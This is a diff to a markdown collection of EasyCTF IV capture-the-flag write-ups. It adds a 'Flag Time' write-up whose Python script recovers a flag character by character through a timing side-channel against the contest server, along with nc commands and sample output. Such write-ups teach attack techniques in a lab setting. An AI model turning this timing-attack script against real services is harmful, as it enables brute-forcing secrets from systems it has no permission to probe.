@@ -311,6 +311,7 @@ ___
 
 ### Write-up
 The best solution was provided by the original write-up: [here](https://github.com/EasyCTF/easyctf-iv-problems/blob/master/prog_xor/grader.py):
+
 ```python
 #Original EasyCTF_V write-up
 a, b = map(int, input().split(" "))
@@ -435,6 +436,9 @@ ___
 
 ### Write-up
 We have to reverse that cipher text. So we need to add just one line to the python file:
+
+**[solution.py](resources/intro-30-reverse_engineering/solution.py)**
+
 ```python
 #!/usr/bin/env python3
 import binascii
@@ -494,6 +498,7 @@ ___
 
 ### Write-up
 The best solution was provided by the original write-up: [here](https://github.com/EasyCTF/easyctf-iv-problems/blob/master/prog_input/grader.py):
+
 ```python
 #Original EasyCTF_V write-up
 name = input()
@@ -533,6 +538,7 @@ ___
 
 ### Write-up
 The best solution was provided by the original write-up: [here](https://github.com/EasyCTF/easyctf-iv-problems/blob/master/prog_loop/grader.py):
+
 ```python
 #Original EasyCTF_V write-up
 n = int(input())
@@ -955,6 +961,151 @@ ___
 
 
 
+## Flag Time
+
+**Category:** Miscellaneous
+**Points:** 80
+**Description:**
+
+>This problem is so easy, it can be solved in a matter of seconds. Connect to ```c1.easyctf.com:12482```.
+
+**Hint:**
+
+>time for u to get an ez flag
+
+<p align="center">
+<img src="resources/miscellaneous-80-flag_time/_description.PNG"/>
+</p>
+
+### Write-up
+Starting by executing this command in a shell terminal:
+```
+nc c1.easyctf.com 12482
+```
+
+Output :
+```
+enter the flag:
+```
+
+But, whatever the data that we send, the socket connection exit immediatly. And knowing that the flag starts with ```easyctf{```, we send ```easyctf{```, and there the socket connection will take some seconds before exiting.
+
+So this task is based on a timing attack: for each correct flag character, the server wait a specific time to return a response.
+
+There, we have to create a script that find for each character the maximum of the time spent while receiving the server's response, character by character, building the flag until we find the flag from the "easyctf{" part until the "}" part.
+
+**[solution.py](resources/miscellaneous-80-flag_time/solution.py)**
+
+```python
+#!/usr/bin/python
+import socket
+import time
+import re
+
+def netcat(hostname, port):
+ # Maximum duration (total)
+ max_duration=0
+ # The first part of the flag (to skip waiting for finding this part of the flag)
+ flag="easyctf{"
+ char_found=''
+ # The possible characters that we can find in a flag
+ T=list("abcdefghijklmnopqrstuvwxyz_-0123456789{}")
+ # Initiate the socket
+ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ # Starting the connection
+ s.connect((hostname, port))
+ # Receiving the data : "enter the flag:"
+ data = s.recv(10240)
+ # Sending the flag to get the initial time of waiting
+ print "Sending",flag
+ s.send(flag+"\n")
+ # Getting the current time before receiving the answser
+ n1=time.time()
+ # receiving the answer
+ data = s.recv(10240)
+ # Getting the current time after receiving the answer
+ n2=time.time()
+ # We should not forget to close the connection
+ s.close()
+ # Computing the duration of the operation
+ max_duration=round(n2-n1,1)
+ print "Initial duration",max_duration
+ # Be carefull, you have to assist the script while running it
+ # I'm too lazy to write something beautiful than an infinite loop especially in a CTF :p
+ # So after guessing this part "easyctf{" and then this part "}", you have to stop the script (Ctrl+C)
+ while 1:
+  # For each supported character
+  for i in T:
+    # We repeat the previous operation
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((hostname, port))
+    data = s.recv(10240)
+    print "Sending",flag+str(i)
+    s.send(flag+str(i)+"\n")
+    n1=time.time()
+    data = s.recv(10240)
+    n2=time.time()
+    duration=round(n2-n1,1)
+    # Until getting the new greatter duration
+    if duration>max_duration:
+      # We save the position of the character
+      char_found=str(i)
+      # We compute the additionnal waiting time added when we send
+      #  this character with the previous found characters
+      # This help us to accelerate the operation of finding the character
+      #  that might be the real character, part of the flag
+      tmp=duration-max_duration
+      #We update the max duration (total)
+      max_duration=duration
+      # If this character triggered a waiting time > 0.2 (in my server I have a high speed internet)
+      if tmp>0.2:
+        #So this is character is part of the flag. Then, we break the loop of finding the (i)th character of the flag
+        break
+    print "Received:", repr(data),"in",duration,"seconds"
+    # We should not forget to close the connection
+    s.close()
+  # We build the flag character by character
+  flag=flag+char_found
+  # We print the actual flag
+  print "Flag :",flag,"(duration=",max_duration,")"
+
+netcat("c1.easyctf.com", 12482)
+```
+
+We run this script :
+```
+chmod +x solution.py
+./solution.py
+```
+
+Output :
+```
+Sending easyctf{
+Initial duration 5.5
+Sending easyctf{a
+Received: 'no\n' in 5.5 seconds
+Sending easyctf{b
+Received: 'no\n' in 5.5 seconds
+Sending easyctf{c
+Received: 'no\n' in 5.5 seconds
+Sending easyctf{d
+Received: 'no\n' in 5.5 seconds
+Sending easyctf{e
+Flag : easyctf{e (duration= 5.8 )
+Sending easyctf{ea
+Received: 'no\n' in 5.8 seconds
+Sending easyctf{eb
+Received: 'no\n' in 5.8 seconds
+...
+```
+
+So the flag is : ```easyctf{ez_t1m1ng_4ttack!}```.
+___
+
+
+
+
+
 ## Starman 1
 
 **Category:** Programming
@@ -1000,6 +1151,7 @@ ___
 ### Write-up
 This task illustrate the Knapsack_problem
 The best solution was provided by the original write-up: [here](https://github.com/EasyCTF/easyctf-iv-problems/blob/master/starman_1/grader.py):
+
 ```python
 #Original EasyCTF_V write-up
 import sys
@@ -1054,6 +1206,8 @@ ___
 We should decrypt the encrypted file like this : ```encrypted_file xor (key_part_1 + key_part_2)```.
 
 So we created a python script that guess the first part of the key, the the second part:
+
+**[solution.py](resources/cryptography-100-keyed_xor/solution.py)**
 
 ```python
 #!/usr/bin/python
